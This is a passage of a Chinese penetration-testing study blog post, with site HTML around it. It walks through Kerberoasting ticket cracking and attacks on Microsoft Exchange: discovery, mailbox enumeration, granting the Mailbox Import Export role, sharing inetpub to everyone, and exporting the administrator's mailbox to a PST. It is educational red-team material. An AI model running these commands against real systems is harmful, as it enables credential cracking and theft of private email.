+<pre><code>python tgsrepcrack.py wordlist.txt mssql.kirbi</code></pre></li>
+</ol>
+<hr>
+<h3 id="exchange服务器安全"><a href="#exchange服务器安全" class="headerlink" title="exchange服务器安全"></a>exchange服务器安全</h3><p>Exchange是微软出品的电子邮件服务组件，是一个消息与协作系统。Exchange可以本地化部署，也可以以Exchange Online的形式将Exchange服务器托管在云端。</p>
+<p>Exchange支持Poweshell对其进行本地或远程操作，这一方面方便了运维人员对Exchange的管理和配置，另一方面为攻击者对Exchange进行恶意操作创造了条件。</p>
+<p>Exchange在逻辑上分为三层：</p>
+<ul>
+<li>网络层（Network Layer）</li>
+<li>目录层（Directory Layer）</li>
+<li>消息层（Messaging Layer）</li>
+</ul>
+<p>邮件服务器有五个角色：</p>
+<ul>
+<li><strong>邮箱服务器</strong></li>
+<li><strong>客户端访问服务器</strong></li>
+<li><strong>集线传输服务器</strong></li>
+<li>统一消息服务器</li>
+<li>边缘传输服务器</li>
+</ul>
+<p>Exchange支持的访问接口和协议：</p>
+<ul>
+<li>OWA：Exchange提供的Web邮箱</li>
+<li>EAC：Exchange管理中心</li>
+<li>Outlook Anywhere</li>
+<li>MAPI</li>
+<li>Exchange ActiveSync</li>
+<li>Exchange Web Service</li>
+</ul>
+<h4 id="Exchange服务发现"><a href="#Exchange服务发现" class="headerlink" title="Exchange服务发现"></a>Exchange服务发现</h4><p>端口扫描</p>
+<pre><code>nmap -A -O -sV 192.168.100.194</code></pre><p>SPN查询</p>
+<pre><code>setspn -T pentest.com -F -Q */*</code></pre><h4 id="查看邮件数据库"><a href="#查看邮件数据库" class="headerlink" title="查看邮件数据库"></a>查看邮件数据库</h4><p>将Exchange管理单元添加到当前会话中</p>
+<pre><code>add-pssnapin microsoft.exchange*</code></pre><p>-Server参数指定服务器查询</p>
+<pre><code>Get-MailboxDatabase -server &quot;Exchange1&quot;</code></pre><p>查询数据库的物理路径</p>
+<pre><code>Get-MailboxDatabase -Identity &#39;数据库名&#39; | Format-List Name,EdbFilePath,LogFolderPath</code></pre><h4 id="获取现有用户的邮件地址"><a href="#获取现有用户的邮件地址" class="headerlink" title="获取现有用户的邮件地址"></a>获取现有用户的邮件地址</h4><pre><code>Get-Mailbox | format-tables Name,WindowsEmailAddress</code></pre><h4 id="查看指定用户的邮箱使用信息"><a href="#查看指定用户的邮箱使用信息" class="headerlink" title="查看指定用户的邮箱使用信息"></a>查看指定用户的邮箱使用信息</h4><pre><code>get-mailboxstatistics -identity administrator | Select DisplayName,ItemCount,TotalItemSize,LastLogonTime</code></pre><h4 id="配置用户的导入-导出权限"><a href="#配置用户的导入-导出权限" class="headerlink" title="配置用户的导入/导出权限"></a>配置用户的导入/导出权限</h4><p>查看有导入/导出权限的用户</p>
+<pre><code>Get-managementRoleAssignment -role &quot;Mailbox Import Export&quot; | Format-List RoleAssigneeName</code></pre><p>添加权限</p>
+<pre><code>New-ManagementRoleAssignment -Name &quot;Import Export_Domain Admins&quot; -User &quot;Administrator&quot; -Role &quot;Mailbox Import Export&quot;</code></pre><blockquote>
+<p>添加后需重启Exchange服务器</p>
+</blockquote>
+<p>删除权限</p>
+<pre><code>Remove-ManagementRoleAssignment &quot;Import Export_Domain Admins&quot; -Confirm:$false</code></pre><h4 id="设置网络共享文件夹"><a href="#设置网络共享文件夹" class="headerlink" title="设置网络共享文件夹"></a>设置网络共享文件夹</h4><p>将C盘的inetpub文件夹设置为任意用户都可以操作的文件夹</p>
+<pre><code>net share inetpub=c:\inetpub /grant:everyone,full</code></pre><h4 id="导出用户的电子邮件"><a href="#导出用户的电子邮件" class="headerlink" title="导出用户的电子邮件"></a>导出用户的电子邮件</h4><pre><code>New-MailboxExportRequest -Mailbox administrator -FilePath \\192.168.100.194\inetpub\administrator.pst</code></pre><hr>
+<p>参考：内网安全攻防渗透测试实战指南</p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Doublenine</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://gostycw.github.io/2021/02/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/">https://gostycw.github.io/2021/02/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Doublenine</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                                    <span class="chip bg-color">渗透测试</span>
+                                </a>
+                            
+                                <a href="/tags/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">
+                                    <span class="chip bg-color">红队攻防</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/02/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="内网渗透学习（五）">
+                        
+                        <span class="card-title">内网渗透学习（五）</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            内网渗透学习（五）使用卷影拷贝服务提取ntds.dit在活动目录中，所有的数据都保存在ntds.dit文件中。ntds.dit是一个二进制文件，存储位置是域控的%SystemRoot%\ntds\ntds.dit。和SAM文件一样被Wind
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-02-15
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
+                                </a>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/" class="post-category">
+                                    红队攻防
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                        <span class="chip bg-color">渗透测试</span>
+                    </a>
+                    
+                    <a href="/tags/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">
+                        <span class="chip bg-color">红队攻防</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/02/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="内网渗透学习（三）">
+                        
+                        <span class="card-title">内网渗透学习（三）</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            内网渗透学习（三）权限分类
+User：普通用户权限
+Administrator：管理员权限。
+System：系统权限。可以对SAM等敏感文件进行读取
+TrustedInstaller：Windows中的最高权限
+
+
+系统内核溢出漏洞查看补丁
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-08
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
+                                </a>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/" class="post-category">
+                                    红队攻防
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                        <span class="chip bg-color">渗透测试</span>
+                    </a>
+                    
+                    <a href="/tags/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">
+                        <span class="chip bg-color">红队攻防</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="575744977"
+                   fixed='true'
+                   autoplay='true'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.2'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">Doublenine</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">42.2k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:3302013712@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3302013712" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3302013712" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/search.xml", 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
